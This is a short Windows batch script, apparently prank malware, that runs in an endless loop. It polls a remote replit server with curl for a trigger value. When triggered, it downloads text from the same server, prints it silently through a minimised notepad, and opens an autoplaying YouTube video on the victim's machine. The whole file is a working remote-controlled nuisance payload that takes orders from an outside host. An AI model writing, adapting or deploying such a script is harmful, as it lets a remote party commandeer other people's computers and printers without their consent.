:x
FOR /F "tokens=*" %%g IN ('curl -0 "https://PrinterMalware.wraient.repl.co/doit/"') do (SET VAR=%%g)

del C:\Users\Public\Documents\test.txt
if %VAR%==1 FOR /F "tokens=*" %%g IN ('curl -0 "https://PrinterMalware.wraient.repl.co/content/"') do (SET TEXT=%%g)
if %VAR%==1 echo %TEXT% > C:\Users\Public\Documents\test.txt
if %VAR%==1 start /min notepad.exe /p C:\Users\Public\Documents\test.txt
if %VAR%==1 start https://www.youtube.com/embed/k85mRPqvMbE?autoplay=1
timeout /t 30
goto x
